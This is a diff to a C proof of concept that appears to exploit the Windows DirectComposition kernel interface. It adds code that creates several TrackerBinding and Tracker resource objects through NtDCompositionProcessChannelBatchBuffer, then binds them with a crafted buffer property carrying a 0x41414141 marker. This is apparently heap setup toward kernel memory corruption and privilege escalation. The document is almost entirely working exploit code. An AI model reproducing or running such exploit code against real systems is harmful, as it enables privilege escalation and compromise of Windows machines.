@@ -37,7 +37,9 @@ DWORD szBuff[0x400];
 
 #define TrackerBinding1 1
 #define TrackerBinding2 2
-#define Tracker 3
+#define Tracker1 3
+#define Tracker2 4
+#define Tracker3 5
 
 pNtDCompositionCreateChannel NtDCompositionCreateChannel;
 pNtDCompositionProcessChannelBatchBuffer NtDCompositionProcessChannelBatchBuffer;
@@ -62,4 +64,77 @@ int main(int argc, TCHAR* argv[])
 
     printf("[*] Create channel ok, channel=0x%x\n", hChannel);
 
+    
+    printf("[+] Create First TrackerBinding Resource Object\n");
+    *(DWORD*)(pMappedAddress) = nCmdCreateResource;
+    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)TrackerBinding1;
+    *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)CInteractionTrackerBindingManagerMarshaler;
+    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
+    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
+    if (!NT_SUCCESS(ntStatus)) {
+        printf("[-] Fail to create Direct Composition Resource\n");
+        exit(-1);
+    }
+
+
+    printf("[+] Create Second TrackerBinding Resource Object\n");
+    *(DWORD*)(pMappedAddress) = nCmdCreateResource;
+    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)TrackerBinding2;
+    *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)CInteractionTrackerBindingManagerMarshaler;
+    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
+    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
+    if (!NT_SUCCESS(ntStatus)) {
+        printf("[-] Fail to create Direct Composition Resource\n");
+        exit(-1);
+    }
+
+    printf("[+] Create Tracker Resource 1 Object\n");
+    *(DWORD*)(pMappedAddress) = nCmdCreateResource;
+    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)Tracker1;
+    *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)CInteractionTrackerMarshaler;
+    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
+    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
+    if (!NT_SUCCESS(ntStatus)) {
+        printf("[-] Fail to create Direct Composition Resource\n");
+        exit(-1);
+    }
+
+    printf("[+] Create Tracker Resource 2 Object\n");
+    *(DWORD*)(pMappedAddress) = nCmdCreateResource;
+    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)Tracker2;
+    *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)CInteractionTrackerMarshaler;
+    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
+    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
+    if (!NT_SUCCESS(ntStatus)) {
+        printf("[-] Fail to create Direct Composition Resource\n");
+        exit(-1);
+    }
+
+    printf("[+] Create Tracker Resource 3 Object\n");
+    *(DWORD*)(pMappedAddress) = nCmdCreateResource;
+    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)Tracker3;
+    *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)CInteractionTrackerMarshaler;
+    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
+    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
+    if (!NT_SUCCESS(ntStatus)) {
+        printf("[-] Fail to create Direct Composition Resource\n");
+        exit(-1);
+    }
+
+    printf("[+] Bind Tracker to the First TrackerBinding\n");
+    szBuff[0] = Tracker1;
+    szBuff[1] = Tracker2;
+    szBuff[2] = 0x41414141;
+
+    UINT datasize = 0xC; // Size == 0x10
+    *(DWORD*)pMappedAddress = nCmdSetBufferProperty;
+    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)TrackerBinding1;
+    *(DWORD*)((PUCHAR)pMappedAddress + 8) = 0;
+    *(DWORD*)((PUCHAR)pMappedAddress + 0xc) = datasize;
+    CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, datasize);
+    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + datasize, &dwArg1, &dwArg2);
+    if (!NT_SUCCESS(ntStatus)) {
+        printf("[-] Fail to create Direct Composition Resource\n");
+        exit(-1);
+    }
 }
